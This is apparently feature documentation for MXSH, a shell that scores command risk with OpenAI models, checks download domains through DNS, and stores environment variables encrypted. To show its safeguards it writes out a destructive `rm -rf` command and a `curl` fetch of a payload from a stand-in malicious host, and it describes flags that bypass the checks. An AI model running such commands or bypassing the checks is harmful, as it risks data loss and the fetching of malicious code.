# MXSH Features

This document provides an in-depth exploration of MXSH's capabilities and how they work together to create a secure, universal shell environment.

## Auto Resizer: Cross-Platform Command Translation

### Overview

The Auto Resizer is MXSH's intelligent command translation system. It detects when you're using commands or package managers from a different operating system and automatically converts them to platform-appropriate equivalents.

### How It Works

When you enter a command, Auto Resizer:

1. **Analyzes** the command syntax and identifies the source shell/package manager
2. **Compares** against your current operating system and configured shell
3. **Determines** if conversion is necessary for compatibility
4. **Translates** the command to an equivalent form for your platform
5. **Requests confirmation** before executing the converted command

### Supported Conversions

**Package Managers:**
- `apt install package` → `winget install package` (Linux to Windows)
- `brew install package` → `apt install package` (macOS to Linux)
- `winget install package` → `brew install package` (Windows to macOS)
- `yum install package` → `apt install package` (RHEL to Debian-based)
- `pacman -S package` → `apt install package` (Arch to Debian)
- `choco install package` → `winget install package` (Legacy Windows)

**Shell Syntax:**
- PowerShell cmdlets → Bash equivalents
- Bash utilities → PowerShell cmdlets
- CMD commands → Modern shell alternatives

### Example Usage

On a Windows machine:

```bash
apt install git
```

Auto Resizer detects and converts:

```
⚡ Auto Resizer: Command conversion detected
│ Source: apt → Target: PowerShell
│ Original: apt install git
│ Converted: winget install git
│ Package manager converted from Debian APT to Windows Package Manager

Execute converted command? (y/n):
```

### Availability

Auto Resizer is automatically enabled when using standard models (GPT-5, GPT-5.2, GPT-5.2 Pro, GPT-4.1). Lightweight models (GPT-5 Mini, GPT-5 Nano) disable this feature to minimize API usage.

## AI-Powered Security Validation

### Risk Assessment System

MXSH analyzes every non-whitelisted command through OpenAI's API to evaluate potential risks before execution. The analysis provides:

- **Risk Level**: SAFE, LOW, MEDIUM, HIGH, or CRITICAL
- **Summary**: Brief description of what the command does
- **Details**: Specific concerns or security implications
- **Recommendation**: Whether execution is advisable

### Risk Level Behaviors

**SAFE**
Command executes immediately without user intervention. Reserved for operations with no security concerns.

**LOW**
Minor risks present. User confirmation requested but execution permitted.

**MEDIUM**
Notable concerns identified. User must explicitly approve execution.

**HIGH**
Significant security risks. Execution blocked by default. Use `--skip-ai-check` to bypass.

**CRITICAL**
Severe or destructive operations. Execution blocked. Bypass flag required.

### Analysis Example

```bash
rm -rf /important/data
```

MXSH response:

```
Analyzing command...

Risk Level: HIGH
Summary: Recursive deletion of directory without confirmation
Details: This command permanently deletes all files in the specified path
         without prompting for confirmation. Data cannot be recovered.

Command blocked due to high risk.
  Tip: Use --skip-ai-check flag to bypass (not recommended)
```

### Whitelisted Commands

Certain read-only commands bypass AI analysis for immediate execution:

- `ls`, `dir`: Directory listing
- `pwd`: Print working directory
- `whoami`: Current user information
- `hostname`: System name
- `date`, `time`: Time information
- `cat`, `head`, `tail`: File reading
- `tree`: Directory structure
- `git`: All git operations (fully whitelisted)

Whitelisted commands with arguments execute only if:
- Arguments are option flags (start with `-`)
- No dangerous patterns present (pipes, redirects, command substitution)

## DNS-Based Download Protection

### Security for Network Operations

Commands that download content from the internet (`curl`, `wget`) undergo DNS-based security validation before execution.

### Validation Process

1. **URL Extraction**: Parse command to identify HTTP/HTTPS endpoints
2. **DNS Resolution**: Query Cloudflare's malware-blocking resolver (1.1.1.2)
3. **Safety Check**: Determine if the domain is known malicious or local
4. **Decision**: Allow, block, or request user confirmation

### Blocked Scenarios

**Malicious Domains**
If Cloudflare's malware filter identifies a domain as dangerous, the download is blocked entirely.

**Local Addresses**
Private IP ranges and localhost addresses are rejected to prevent SSRF-style attacks:
- 127.0.0.0/8 (localhost)
- 10.0.0.0/8 (private)
- 172.16.0.0/12 (private)
- 192.168.0.0/16 (private)

### Example

```bash
curl http://malicious-site.example/payload.sh
```

MXSH response:

```
Checking URL security with Cloudflare DNS (1.1.1.2)...

URL: http://malicious-site.example/payload.sh
Status: BLOCKED
Reason: Domain flagged by security filter

✗ Command blocked due to security concerns.
  Tip: Use --skip-dns-check flag to bypass (not recommended)
```

### Bypass Option

For trusted sources behind DNS filters:

```bash
curl http://internal-server/script.sh --skip-dns-check
```

## Encrypted Environment Variable Management

### Storage Architecture

MXSH provides encrypted storage for sensitive environment variables. Two encryption modes are supported:

**Machine-Based Encryption**
Variables encrypted using hardware-specific parameters. Decryption only possible on the original machine.

**Password-Based Encryption**
Variables encrypted with a user-provided password. Portable across machines when the password is known.

### Encryption Details

- **Algorithm**: AES-256-GCM for authenticated encryption
- **Key Derivation**: Argon2 for password-based encryption
- **Storage Format**: Base64-encoded encrypted values with authentication tags

### Operations

**Save a Variable**

```bash
env save DATABASE_URL
```

Prompts for the value and stores it encrypted.

**List Variables**

```bash
env
```

Displays variable names without revealing values.

**Remove a Variable**

```bash
env remove DATABASE_URL
```

Deletes the encrypted variable from storage.

**Export to File**

```bash
env export DATABASE_URL          # Single variable
env export *                      # All variables
```

Creates an encrypted `.mxenv` file for backup or sharing.

**Import from File**

```bash
env import backup.mxenv
```

Loads variables from an encrypted export file.

### Security Considerations

- Values are never displayed in plaintext during normal operations
- Encryption keys are derived from machine-specific data or user passwords
- Export files use the same encryption as local storage
- Variables exist only in MXSH's encrypted storage, not in the system environment

## Multi-Shell Support

### Shell Routing

MXSH can execute commands in multiple shell environments from a single interface.

**Configured Default Shell**
Commands without prefixes route to your selected default shell (configurable via `mxsh shells`).

**Explicit Shell Selection**
Use prefixes to target specific shells:

- `$:` PowerShell
- `#:` Bash
- `>:` CMD

### Cross-Platform Behavior

The same MXSH syntax works on any platform:

```bash
$: Get-Process powershell
```

On Windows, this executes in PowerShell directly. On Linux/macOS, the command would be analyzed and potentially converted.

### Shell-Specific Features

Each shell retains its native capabilities:

**PowerShell**: Object pipeline, cmdlets, .NET integration
**Bash**: POSIX utilities, scripting, job control
**CMD**: Windows legacy commands, batch scripts

## Model Selection and Performance

### Available Models

MXSH supports multiple OpenAI models, each with different characteristics:

| Model | Speed | Accuracy | Cost | Auto Resizer |
|-------|-------|----------|------|--------------|
| GPT-5.2 Pro | Slow | Highest | High | Enabled |
| GPT-5.2 | Medium | Very High | Medium-High | Enabled |
| GPT-5 | Medium | High | Medium | Enabled |
| GPT-5 Mini | Fast | Good | Low | Disabled |
| GPT-5 Nano | Fastest | Basic | Minimal | Disabled |
| GPT-4.1 | Medium | High | Medium | Enabled |

### Model Impact

**Full-Featured Models**
Standard models provide comprehensive analysis:
- Detailed security assessments
- Auto Resizer command conversion
- Context-aware recommendations

**Lightweight Models**
Nano and Mini models prioritize speed and cost:
- Basic security checks
- No Auto Resizer functionality
- Faster command processing
- Reduced API costs

### Selection Strategy

Choose based on your priorities:

- **Maximum Security**: GPT-5.2 Pro
- **Balanced Use**: GPT-5 or GPT-5.2
- **Cost Optimization**: GPT-5 Mini
- **Minimal Overhead**: GPT-5 Nano

Change models at any time:

```bash
mxsh models
```

## Built-In Utilities

### System Information

**Current User and OS**

```bash
whoami
```

Displays the active username and operating system.

**CPU Monitoring**

```bash
cpu
```

Shows the top 10 processes by CPU usage, refreshed in real-time.

### Navigation

**Enhanced Directory Changing**

```bash
cd ~/projects     # Absolute path with tilde expansion
cd ../other       # Relative navigation
cd -              # Return to previous directory
```

MXSH's `cd` command supports features that may not exist in your default shell.

### Screen Management

**Clear Display**

```bash
clear
new
```

Clears the terminal and redisplays the MXSH banner.

### Project Information

**Contributors**

```bash
credit
credits
```

Lists project contributors and acknowledgments.

## Command Safety Flags

### Skip AI Check

Bypass AI-powered security analysis:

```bash
dangerous-command --skip-ai-check
```

**Use case**: Trusted scripts that trigger false positives
**Warning**: Disables primary security mechanism

### Skip DNS Check

Bypass DNS-based download validation:

```bash
curl http://trusted-internal-server/file --skip-dns-check
```

**Use case**: Internal or private network resources
**Warning**: Allows potentially dangerous downloads

## Session Management

### Exiting MXSH

Multiple exit commands are supported:

```bash
exit
quit
q
:q
```

The `:q` syntax provides a familiar option for Vim users.

### Command History

MXSH maintains command history across sessions using the rustyline library. Use arrow keys to navigate previous commands.

### Tab Completion

Basic tab completion is available for built-in commands and file paths.
